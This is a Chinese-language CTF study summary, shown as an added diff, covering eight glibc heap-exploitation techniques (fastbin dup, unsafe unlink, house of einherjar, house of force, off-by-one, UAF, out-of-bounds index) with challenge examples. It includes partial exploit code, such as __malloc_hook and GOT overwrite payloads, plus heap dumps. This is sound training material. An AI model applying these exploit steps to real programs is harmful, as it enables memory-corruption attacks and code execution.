@@ -1,0 +1,470 @@
+## 学习汇总
+
+###  序言
+
+ **自从加入RTIS交流群,
+在7o8v师傅，gd大佬的帮助下，PWN学习之路进入加速度。下面是八周学习的总结，基本上是按照how2heap路线走的。由于八周内容全写，篇幅太长，这里只讲述每道PWN题所用到的一个知识点。**
+
+###  第一节(fastbin_dup_into_stack)
+
+**知识点**
+
+利用fastbin之间,单链表的连接的特性, 溢出修改下一个free chunk的地址, 造成任意地址写.
+
+**例子: 0CTF 2017 Babyheap**
+
+> Fill功能可以填充任意长字节, 漏洞在此.
+>
+> leak memory: libc address
+>
+> modify __malloc_hook内容为one_gadget
+>
+> getshell
+
+**重点: fastbin attack**
+
+First Step
+
+    
+    
+    alloc(0x60)
+    alloc(0x40)
+    0x56144ab7e000: 0x0000000000000000  0x0000000000000071 --> chunk0 header
+    0x56144ab7e010: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e020: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e030: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e040: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e050: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e060: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e070: 0x0000000000000000  0x0000000000000051 --> chunk1 header
+    0x56144ab7e080: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e090: 0x0000000000000000  0x0000000000000000
+
+Second Step
+
+    
+    
+    Fill(0x10, 0x60 + 0x10, "A" * 0x60 + p64(0) + p64(0x71)) --> 开始破坏chunk1 header
+    0x56144ab7e000: 0x0000000000000000  0x0000000000000071
+    0x56144ab7e010: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e020: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e030: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e040: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e050: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e060: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e070: 0x0000000000000000  0x0000000000000071  --> 已修改为0x71
+    0x56144ab7e080: 0x0000000000000000  0x0000000000000000
+
+Third Step: 申请small chunk
+
+    
+    
+    0x56144ab7e060: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e070: 0x0000000000000000  0x0000000000000071
+    0x56144ab7e080: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e090: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e0a0: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e0b0: 0x0000000000000000  0x0000000000000000
+    0x56144ab7e0c0: 0x0000000000000000  0x0000000000000111 --> chunk2 header
+
+Fouth Step: 破坏chunk2 header, 最后目的是释放chunk2
+
+    
+    
+    Fill(2, 0x20, 'c' * 0x10 + p64(0) + p64(0x71)) --> fake chunk header
+    Free(1)
+    Alloc(0x60)
+    0x56144ab7e000: 0x0000000000000000  0x0000000000000071
+    ......
+    0x56144ab7e060: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e070: 0x0000000000000000  0x0000000000000071
+    ......
+    0x56144ab7e0e0: 0x0000000000000000  0x0000000000000071 --> fake chunk header
+
+Fifth Step: 修复chunk2 header, free
+
+    
+    
+    Fill(1, 0x40 + 0x10, 'b' * 0x60 + p64(0) + p64(0x111)) --> 修复chunk2
+    Free(2)
+    Dump(1)
+    0x56144ab7e060: 0x6161616161616161  0x6161616161616161
+    0x56144ab7e070: 0x0000000000000000  0x0000000000000071
+    0x56144ab7e080: 0x6262626262626262  0x6262626262626262
+    0x56144ab7e090: 0x6262626262626262  0x6262626262626262
+    ......
+    0x56144ab7e0c0: 0x0000000000000000  0x0000000000000111
+    0x56144ab7e0d0: 0x00007f26abbacb78  0x00007f26abbacb78 --> 指向libc中的某地址(程序使用的是write, 将内容全部打印, 不会出现\x00截止)
+    0x56144ab7e0e0: 0x0000000000000000  0x0000000000000071
+
+Sixth Step: 修改下一个free chunk为__malloc_hook
+
+    
+    
+    Free(1)　　
+    payload = 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0) # fake 　  　chunk + 修改修改的地址Fill(0, 0x60 + 0x10 + 0x10, payload)
+
+[详解解析](https://blog.csdn.net/qq_33528164/article/details/79515761)
+[](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/fastbin_dup)
+
+[文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/fastbin_dup)
+
+###  第二节(fastbin_dup_consolidate)
+
+**知识点**
+
+> 当topchunk size不足以满足申请的大小, 会合并fastbin的空闲chunk. 如若在不足: 主分配区调用sbrk, 增加top
+> chunk大小; 非主分配区调用mmap来分配一个新的sub-heap.
+>
+> got表中存放着函数的真实地址, 函数调用会去got表中查找函数地址, 然后跳转.修改got表对应函数的地址, 达到getshell目的.
+>
+> double free: 释放两次内存, 可与Unlink搭配实现任意地址读写.
+
+**栗子:HITCON CTF 2016 SleepyHolder**
+
+**程序分析**
+
+可以选择申请40, 4000, 400000三种不同大小的堆块, 每种只能申请一个. 400000会清空fastbin. 删除: 将相应的标志位置位0修改,
+不检查相应的指针是否已释放, 造成Double Free.
+
+**重点**
+
+演示过程:
+
+> 申请small secret、big secret
+>
+> 删除small secret
+>
+> 申请large secret
+
+**申请large secret之前**
+
+**![15258767914427.png!small](https://image.3001.net/images/20180509/15258767914427.png!small)**
+
+**之后**
+
+![15258768369507.png!small](https://image.3001.net/images/20180509/15258768369507.png!small)
+
+> [详细解析](https://blog.csdn.net/qq_33528164/article/details/80040197)
+> [](https://github.com/BBS-Bill-> Gates/CTF/tree/master/how2heap/fastbin_dup_consolidate)
+>
+> [文件下载](https://github.com/BBS-Bill-> Gates/CTF/tree/master/how2heap/fastbin_dup_consolidate)
+
+###  第三节(unsafe_unlink)
+
+**知识点**
+
+unlink: 当freer两个相邻的small chunk时, 会发生合并的特性来攻击的. 合并后的chunk块放在双向链表构成的unsorted
+bin.
+
+**栗子:HITCON CTF 2014 stkof**
+
+**程序分析**
+
+> alloc:输入分配内存的大小
+>
+> read_in： 写入任意长度, 漏洞在此
+>
+> free：useless
+
+**重点**
+
+绕过size检查绕过指针检查
+
+![15258768463589.png!small](https://image.3001.net/images/20180509/15258768463589.png!small)
+
+**绕过size**
+
+    
+    
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr ("corrupted size vs. prev_size");
+
+**过程捋一下**
+
+    
+    
+    > P=0x1307540, chunksize(P) = 0x20
+    > nextchunk(P) = 0x1307540 + 0x20 = 0x1307540 + 0x20
+    > prev_size = [0x1307540 + 0x20] = 0x20
+    > 0x20 = 0x20 , 绕过, 就是fake_chunk, 很好绕过的.
+
+**绕过指针检查**
+
+    
+    
+    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
+      malloc_printerr ("corrupted double-linked list");                              \
+
+**过程捋一下**
+
+    
+    
+    > FD = [0x1307540 + 0x10] = 0x602138,
+    > BK = [0x1307540 + 0x18] = 0x602140
+    > FD->bk = [0x602138 + 0x18] = 0x1307540,
+    > BK-> fd = [0x602140 + 0x10] = 0x1307540
+    > P = 0x1307540
+    > FD->bk != P 为false
+    > BK->fd != P 为false
+    > 成功绕过
+
+[详细解析](https://blog.csdn.net/qq_33528164/article/details/79586902)
+[](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/unsafe_unlink/hitcon_ctf_2014)
+
+[文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/unsafe_unlink/hitcon_ctf_2014)
+
+###  第四节(house_of_einherjar)
+
+**知识点**
+
+house_of_einherjar：该对利用技术可以强制使得malloc返回一个几乎任意地址的chunk, 主要在于滥用free中的后向合并.
+
+**栗子:Seccon CTF 2016 tinypad**
+
+**程序分析**
+
+> Add memo
+>
+> Delete memo: 将指针释放, size位清零, 但没有将对应的指针清零.
+>
+> Edit memo: 存在一个Off_By_One漏洞.
+>
+> Quit
+
+![15258768666373.png!small](https://image.3001.net/images/20180509/15258768666373.png!small)
+
+![15258768743128.png!small](https://image.3001.net/images/20180509/15258768743128.png!small)
+
+**重点**
+
+通过利用Off_By_One和unlink, 修改unsorted bin的指针
+
+1\. 泄露
+
+    
+    
+    add(0x80, "A"*0x80)
+    add(0x80, "B"*0x80)
+    add(0x80, "C"*0x80)
+    add(0x80, "D"*0x80)
+    delete(3)
+    delete(1)
+
+![15258768828178.png!small](https://image.3001.net/images/20180509/15258768828178.png!small)2\.
+house_of_einherjar
+
+    
+    
+    add(0x18, "A"*0x18)
+    add(0x100, "B"*0xf8 + p64(0x11))
+    add(0x100, "C"*0x100)
+    add(0x100, "D"*0x100)
+    tinypad = 0x602040
+    offset = heap + 0x20 - 0x602040 - 0x20
+    fake_chunk = p64(0) + p64(0x101) + p64(0x602060) * 2
+    edit(3, "D"*0x20 + fake_chunk)
+    zero_byte_number = 8 - len(p64(offset).strip("\x00"))
+    '''
+    循环edit的原因是stcpy()会因为空子节而停止copy, 但每次读取都会将最后一个字节变为NULL, 这样就可以用NULL逐一覆盖, 使2号chunk的prev_size为offset
+    '''
+    for i in range(zero_byte_number+1):
+      data = "A"*0x10 + p64(offset).strip("\x00").rjust(8-i, 'f')
+      edit(1, data)
+    delete(2)
+    edit(4, "D"*0x20 + p64(0) + p64(0x101) + p64(main_arena + 0x58)*2) #修复unsorted bin
+
+![1525876892749.png!small](https://image.3001.net/images/20180509/1525876892749.png!small)[详细解析](https://blog.csdn.net/qq_33528164/article/details/79993399)
+[](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/house_of_einherjar)
+
+[文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/how2heap/house_of_einherjar)
+
+###  第五节(house_of_force)
+
+**知识点**
+
+> house_of_force:溢出top chunk, 返回任意地址.
+>
+> top chunk:当bins 和 fastbin不能满足申请的大小时, 就会从top chunk分割相应的大小给用户. 例如: 第一次malloc时,
+> fastbin 和 bins中并没有相应的空闲的chunk, 就会从top chunk中分配.
+
+**栗子:BCTF 2016 bcloud**
+
+**程序分析**
+
+> Welcome: 输入name, host, org.漏洞在此, 构造一定的输入, 可使程序复制过量的数据到相应的堆空间, 可修改top chunk
+> size
+>
+> New Note: malloc
+>
+> Show Note: display
+>
+> Edit Note: update
+>
+> Delete: free
+
+**重点**
+
+    
+    
+    name = "Bill"*0x10
+    org = "A"*0x40
+    host = p32(0xffffffff)
+    welcome(name, org, host)
+
+**前**
+
+![15258769005941.png!small](https://image.3001.net/images/20180509/15258769005941.png!small)
+
+ **后**
+
+![15258769111435.png!small](https://image.3001.net/images/20180509/15258769111435.png!small)
+
+ **原因**
+
+![15258769131633.png!small](https://image.3001.net/images/20180509/15258769131633.png!small)
+
+> [详细解析](https://blog.csdn.net/qq_33528164/article/details/79870585)
+> [](https://github.com/BBS-Bill-Gates/CTF/tree/master/2016/BCTF/bcloud)
+>
+> [文件下载](https://github.com/BBS-Bill-Gates/CTF/tree/master/2016/BCTF/bcloud)
+
+###  第六节(off_by_one)
+
+**知识点**
+
+Off_By_One: 意思就是我们能够多写入一个字节, 不要小看这个字节,有时候能够修改chunk header的状态.
+
+**栗子: Asis CTF 2016 b00ks**
+
+**程序分析**
+
+> Welcome: 输入一个author name, 这个地方存在Off_By_One漏洞, 溢出一个空子节.
+>
+> Create a book: 创建一本书
+>
+> Delete
+>
+> Edit a book
+>
+> Print book detail
+>
+> Change current author name(再次编辑给了我们修改book指针的机会)Exit
+
+**漏洞位置**
+
+![15258769219511.png!small](https://image.3001.net/images/20180509/15258769219511.png!small)
+
+**第一个影响: 信息泄露**
+
+![15258769295208.png!small](https://image.3001.net/images/20180509/15258769295208.png!small)
+
+ **第二个影响: 会修改堆地址**
+
+![15258769345570.png!small](https://image.3001.net/images/20180509/15258769345570.png!small)
+
+ **思路:** 在修改后的堆地址布置一个fake chunk, 可以修改任意地址.
+
+> [详细解析](https://blog.csdn.net/qq_33528164/article/details/79778690)
+>
+>
+> [](https://blog.csdn.net/qq_33528164/article/details/79778690)[文件详解](https://github.com/BBS-> Bill-Gates/CTF/tree/master/ctf-wiki/heap/off_by_one)
+
+###  第七节(UAF)
+
+**知识点**
+
+Use After Free: 内存被释放后, 其对应指针没有被置为NULL, 再次使用有可能使程序崩溃. realloc: 重新修改分配空间,
+源代码可以在文件下载链接中下载, 这个源代码不是很长.
+
+> 申请的比原来大, 释放原来的指针, 重新申请内存.
+>
+> 申请的比原来小, 返回原始指针.
+
+**栗子:CISCN CTF 2018 task_supermarket**
+
+**程序分析**
+
+    
+    
+    struct node{
+        char name[16];
+        int price;
+        int size;
+        char* des;
+    }commodity[15];
+
+> add
+>
+> delete
+>
+> list
+>
+> change price
+
+change description: 漏洞在此.当我们申请一个比原来的堆大的,
+程序并没有更新原来的结构体中的des指针.若我们此时再次申请一个node[1], 而这个node[1]刚好落在node[0]的des区域,
+我们就可以通过编辑node[0]的des来控制node[1].
+
+![15258769421347.png!small](https://image.3001.net/images/20180509/15258769421347.png!small)**思路验证**![1525876947681.png!small](https://image.3001.net/images/20180509/1525876947681.png!small)
+
+![15258769594694.png!small](https://image.3001.net/images/20180509/15258769594694.png!small)
+
+![15258769681567.png!small](https://image.3001.net/images/20180509/15258769681567.png!small)
+
+> [详细解析](https://blog.csdn.net/qq_33528164/article/details/80144580)
+> [](https://github.com/BBS-Bill-Gates/CTF/tree/master/2018/National/pwn/task)
+>
+> [文件下载](https://github.com/BBS-Bill-> Gates/CTF/tree/master/2018/National/pwn/task)
+
+###  第八节(数组越界)
+
+**知识点**
+
+> 数组越界: 就是程序不见验证index的正负, 可能会出现向前覆盖的情况.例如:char *s = "hello,world"; 试一下 s[-1]
+
+**栗子: CISCN 2018 task_note_service**
+
+**程序分析**
+
+> add note: 没有对输入的index, 进行正负判断, 导致数组越界
+>
+> show note
+>
+> edit note
+>
+> delete note
+
+![15258769775701.png!small](https://image.3001.net/images/20180509/15258769775701.png!small)
+
+**思路**
+
+修改free@got的值为shellcode的地址.
+
+**修改之前**
+
+![15258769839092.png!small](https://image.3001.net/images/20180509/15258769839092.png!small)
+
+ **修改之后**
+
+![15258769895043.png!small](https://image.3001.net/images/20180509/15258769895043.png!small)
+
+> [详细解析](https://blog.csdn.net/qq_33528164/article/details/80161477)
+>
+>
+> [](https://blog.csdn.net/qq_33528164/article/details/80161477)[文件下载](https://github.com/BBS-> Bill-Gates/CTF/tree/master/2018/National/pwn/note_service)
+
+###  一点心得
+
+个人觉得以上这些PWN题, 并不是单纯的使用一个点就能解出来的, 我只是挑其中一点举例子而已, 这点没必要纠结.
+
+###  相关链接
+
+> [我的CSDN](https://blog.csdn.net/qq_33528164)
+>
+> [GITHUB](https://github.com/BBS-Bill-Gates)
+>
+> [House系列论文](http://phrack.org/issues/66/10.html)
+
+***本文作者：暴龙兽，转载请注明来自FreeBuf.COM**
+
